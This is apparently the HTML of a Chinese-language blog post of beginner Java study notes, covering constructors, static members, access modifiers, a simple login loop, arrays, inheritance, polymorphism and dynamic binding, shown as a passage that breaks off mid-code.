class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Puppy</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Puppy</span><span class="hljs-params">(String name)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;name is &quot;</span>+name );<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">// 下面的语句将创建一个Puppy对象</span><br>        <span class="hljs-type">Puppy</span> <span class="hljs-variable">myPuppy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Puppy</span>( <span class="hljs-string">&quot;potato&quot;</span> );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造方法无类型</p><p>浮点数强制转换为整型舍弃小数位而不是四舍五入</p><p>静态变量：</p><p>Java 中的静态变量是指在类中定义的一个变量，它与类相关而不是与实例相关，即无论创建多少个类实例，静态变量在内存中只有一份拷贝，被所有实例共享。</p><p>静态变量在类加载时被创建，在整个程序运行期间都存在。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">MyClass.count = <span class="hljs-number">10</span>; <span class="hljs-comment">// 通过类名访问</span><br><span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>obj.count = <span class="hljs-number">20</span>; <span class="hljs-comment">// 通过实例名访问</span><br></code></pre></td></tr></table></figure><p>常量：(用final关键字修饰)</p><p><img src="/2023/04/24/java-note/image-20230913202024115.png"></p><p><img src="/2023/04/24/java-note/image-20230913202203384.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">APP_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MyApp&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">APP_VERSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1.0.0&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DATABASE_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Application name: &quot;</span> + AppConfig.APP_NAME);<br>        System.out.println(<span class="hljs-string">&quot;Application version: &quot;</span> + AppConfig.APP_VERSION);<br>        System.out.println(<span class="hljs-string">&quot;Database URL: &quot;</span> + AppConfig.DATABASE_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>访问控制修饰符</strong></p><p>Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。</p><ul><li><strong>default</strong> (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。</li><li><strong>private</strong> : 在同一类内可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong></li><li><strong>public</strong> : 对所有类可见。使用对象：类、接口、变量、方法</li><li><strong>protected</strong> : 对同一包内的类和所有子类可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong>。</li></ul><p><img src="/2023/04/24/java-note/image-20230823214126600.png"></p><p>用户输入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Age</span>&#123;<br><br>        <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span>  <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>                System.out.println(<span class="hljs-string">&quot;请输入你的姓名：&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> myScanner.next();<br>                System.out.println(<span class="hljs-string">&quot;请输入你的年龄：&quot;</span>);<br>                <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>                System.out.println(<span class="hljs-string">&quot;请输入你的身高：&quot;</span>);<br>                <span class="hljs-type">double</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> myScanner.nextDouble();<br>                System.out.println(name+<span class="hljs-string">&quot;今年&quot;</span>+age+<span class="hljs-string">&quot;岁了，身高&quot;</span>+height);<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BreakExercise02</span> &#123;<br><span class="hljs-comment">//编写一个 main 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//实现登录验证，有 3 次机会，如果用户名为&quot;丁真&quot; ,密码&quot;666&quot;提示登录成功，</span><br><span class="hljs-comment">//否则提示还有几次机会，请使用 for+break 完成</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 思路分析</span><br><span class="hljs-comment">// 1. 创建 Scanner 对象接收用户输入</span><br><span class="hljs-comment">// 2. 定义 String name ; String passwd; 保存用户名和密码</span><br><span class="hljs-comment">// 3. 最多循环 3 次[登录 3 次]，如果 满足条件就提前退出</span><br><span class="hljs-comment">// 4. 定义一般变量 int chance 记录还有几次登录机会</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 代码实现</span><br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">passwd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">chance</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">//登录一次 ，就减少一次</span><br><span class="hljs-keyword">for</span>( <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span>; i++) &#123;<span class="hljs-comment">//3</span><br>System.out.println(<span class="hljs-string">&quot;请输入名字&quot;</span>);<br>name = myScanner.next();<br>System.out.println(<span class="hljs-string">&quot;请输入密码&quot;</span>);<br>passwd = myScanner.next();<br><span class="hljs-comment">//比较输入的名字和密码是否正确</span><br><span class="hljs-comment">//补充说明字符串 的内容 比较 使用的 方法 equals</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;丁真&quot;</span>.equals(name) &amp;&amp; <span class="hljs-string">&quot;666&quot;</span>.equals(passwd)) &#123;<br>System.out.println(<span class="hljs-string">&quot;恭喜你，登录成功~&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//登录的机会就减少一次</span><br>chance--;<br>System.out.println(<span class="hljs-string">&quot;你还有&quot;</span> + chance + <span class="hljs-string">&quot;次登录机会&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>**equals()**方法的用法！</p><p>数组的动态分配：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//(1) 第一种动态分配方式</span><br><span class="hljs-comment">//double scores[] = new double[5];</span><br><span class="hljs-comment">//(2) 第 2 种动态分配方式， 先声明数组，再 new 分配空间</span><br><span class="hljs-type">double</span> scores[] ; <span class="hljs-comment">//声明数组， 这时 scores 是 null</span><br>scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">double</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">// 分配内存空间，可以存放数据</span><br></code></pre></td></tr></table></figure><p>Java数组赋值传地址而不是传值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] arr2 = arr1;<br></code></pre></td></tr></table></figure><p>如果想复制数组并属于独立的数据空间，可以新开辟一块内存，然后传值赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>&#125;;<br><span class="hljs-comment">//创建一个新的数组 arr2,开辟新的数据空间</span><br><span class="hljs-comment">//大小 arr1.length;</span><br><span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr1.length];<br><span class="hljs-comment">//遍历 arr1 ，把每个元素拷贝到 arr2 对应的元素位置</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr1.length; i++) &#123;<br>arr2[i] = arr1[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>方法重载：</p><p><strong>方法名必须相同，形参类型和形参个数至少一个不同，返回类型无要求</strong></p><p>关于”There is no default constructor available in …”，出现这个问题主要是因为子类继承了父类，但是因为父类定义了有参构造方法，导致默认的无参构造方法消失，子类无法从父类继承到默认构造方法，所以要显式在子类构造函数中调用父类的有参构造函数：</p><p>↓这是父类的构造函数：</p><p><img src="/2023/04/24/java-note/image-20230911193326947.png"></p><p>↓这是子类的构造函数：</p><p><img src="/2023/04/24/java-note/image-20230911193121681.png"></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-number">1</span>) 子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访<br>问，要通过父类提供公共的方法去访问<br><span class="hljs-number">2</span>) 子类必须调用父类的构造器， 完成父类的初始化<br><span class="hljs-number">3</span>) 当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无<br>参构造器，则必须在子类的构造器中用 <span class="hljs-keyword">super</span> 去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译<br>不会通过(怎么理解。) [举例说明]<br><span class="hljs-number">4</span>) 如果希望指定去调用父类的某个构造器，则显式的调用一下 : <span class="hljs-keyword">super</span>(参数列表)<br><span class="hljs-number">5</span>) <span class="hljs-keyword">super</span> 在使用时，必须放在构造器第一行(<span class="hljs-keyword">super</span> 只能在构造器中使用)<br><span class="hljs-number">6</span>) <span class="hljs-keyword">super</span>() 和 <span class="hljs-keyword">this</span>() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器<br><span class="hljs-number">7</span>) java 所有类都是 <span class="hljs-built_in">Object</span> 类的子类, <span class="hljs-built_in">Object</span> 是所有类的基类. <span class="hljs-number">8</span>) 父类构造器的调用不限于直接父类！将一直往上追溯直到 <span class="hljs-built_in">Object</span> 类(顶级父类)<br><span class="hljs-number">9</span>) 子类最多只能继承一个父类(指直接继承)，即 java 中是单继承机制。<br>思考：如何让 A 类继承 B 类和 C 类？ 【A 继承 B， B 继承 C】<br><span class="hljs-number">10</span>) 不能滥用继承，子类和父类之间必须满足 <span class="hljs-keyword">is</span>-a 的逻辑关<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230911195730095.png"></p><p>方法重载和重写的对比：</p><p><img src="/2023/04/24/java-note/image-20230911200601071.png"></p><p><img src="/2023/04/24/java-note/image-20230912022112162.png"></p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Animal</span> <span class="hljs-variable">animal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<span class="hljs-comment">//b编译类型Animal，运行类型Cat()</span><br>animal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<span class="hljs-comment">//运行类型改成了Dog()</span><br></code></pre></td></tr></table></figure><p>多态的前提是：两个对象(类)存在继承关系<br>多态的向上转型：</p><p><img src="/2023/04/24/java-note/image-20230912023521736.png"></p><p> 多态向下转型：</p><p><img src="/2023/04/24/java-note/image-20230912023807779.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//向上转型: 父类的引用指向了子类的对象</span><br><span class="hljs-comment">//语法：父类类型引用名 = new 子类类型();</span><br><span class="hljs-type">Animal</span> <span class="hljs-variable">animal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();<span class="hljs-comment">//可以吗? 可以 Object 也是 Cat 的父类</span><br><span class="hljs-comment">//向上转型调用方法的规则如下:</span><br><span class="hljs-comment">//(1)可以调用父类中的所有成员(需遵守访问权限)</span><br><span class="hljs-comment">//(2)但是不能调用子类的特有的成员</span><br><span class="hljs-comment">//(#)因为在编译阶段，能调用哪些成员,是由编译类型来决定的</span><br><span class="hljs-comment">//animal.catchMouse();错误</span><br><span class="hljs-comment">//(4)最终运行效果看子类(运行类型)的具体实现, 即调用方法时，按照从子类(运行类型)开始查找方法</span><br><span class="hljs-comment">//，然后调用，规则我前面我们讲的方法调用规则一致。</span><br>animal.eat();<span class="hljs-comment">//猫吃鱼.. animal.run();//跑</span><br>animal.show();<span class="hljs-comment">//hello,你好</span><br>animal.sleep();<span class="hljs-comment">//睡</span><br><span class="hljs-comment">//老师希望，可以调用 Cat 的 catchMouse 方法</span><br><span class="hljs-comment">//多态的向下转型</span><br><span class="hljs-comment">//(1)语法：子类类型 引用名 =（子类类型）父类引用;</span><br><span class="hljs-comment">//问一个问题? cat 的编译类型 Cat,运行类型是 Cat</span><br><span class="hljs-type">Cat</span> <span class="hljs-variable">cat</span> <span class="hljs-operator">=</span> (Cat) animal;<br>cat.catchMouse();<span class="hljs-comment">//猫抓老鼠</span><br><span class="hljs-comment">//(2)要求父类的引用必须指向的是当前目标类型的对象</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> (Dog) animal; <span class="hljs-comment">//可以吗？</span><br>System.out.println(<span class="hljs-string">&quot;ok~~&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>属性没有重写一说，属性的值看编译类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.poly_.detail_;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyDetail02</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//属性没有重写之说！属性的值看编译类型</span><br><span class="hljs-type">Base</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sub</span>();<span class="hljs-comment">//向上转型</span><br>System.out.println(base.count);<span class="hljs-comment">// ？ 看编译类型 10</span><br><span class="hljs-type">Sub</span> <span class="hljs-variable">sub</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sub</span>();<br>System.out.println(sub.count);<span class="hljs-comment">//? 20</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123; <span class="hljs-comment">//父类</span><br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<span class="hljs-comment">//属性</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sub</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span> &#123;<span class="hljs-comment">//子类</span><br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<span class="hljs-comment">//属性</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>instanceof 比较操作符</strong>，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型，eg：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyDetail03</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">BB</span> <span class="hljs-variable">bb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>                System.out.println(bb <span class="hljs-keyword">instanceof</span> BB);<span class="hljs-comment">// true</span><br>                System.out.println(bb <span class="hljs-keyword">instanceof</span> AA);<span class="hljs-comment">// true</span><br><span class="hljs-comment">//aa 编译类型 AA, 运行类型是 BB</span><br><span class="hljs-comment">//BB 是 AA 子类</span><br>                <span class="hljs-type">AA</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>                System.out.println(aa <span class="hljs-keyword">instanceof</span> AA);<br>                System.out.println(aa <span class="hljs-keyword">instanceof</span> BB);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>                System.out.println(obj <span class="hljs-keyword">instanceof</span> AA);<span class="hljs-comment">//false</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">//System.out.println(str instanceof AA);</span><br>                System.out.println(str <span class="hljs-keyword">instanceof</span> Object);<span class="hljs-comment">//true</span><br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> &#123;&#125; <span class="hljs-comment">//父类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AA</span> &#123;&#125;<span class="hljs-comment">//子类</span><br></code></pre></td></tr></table></figure><p><em><strong>！！！！！动态绑定机制：：：</strong></em></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyDetail03</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>                System.out.println(a.sum());<br>                System.out.println(a.suml());<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> getl() + <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">suml</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i + <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getl</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i;<br>        &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i + <span class="hljs-number">20</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getl</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">suml</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> i + <span class="hljs-number">10</span>;<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>输出：40 30，</p><p>B类继承A类，main()方法里，创建了一个B类的对象a，但是引用类型是A类，意味着a实际上是一个B类的对象，但是通过A类的引用进行访问。B类里重写了<code>sum()</code>，<code>suml()</code>，<code>getl()</code>方法，根据多态的原则，会先调用实际对象的方法。所以调用了B中的<code>sum()</code>和<code>suml()</code>方法，调用的i也是B类中的，即20，因此返回40和30</p><p>再有代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolyDetail03</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>                System.out.println(a.sum());<br>                System.out.println(a.suml());<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">return</span> getl() + <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span 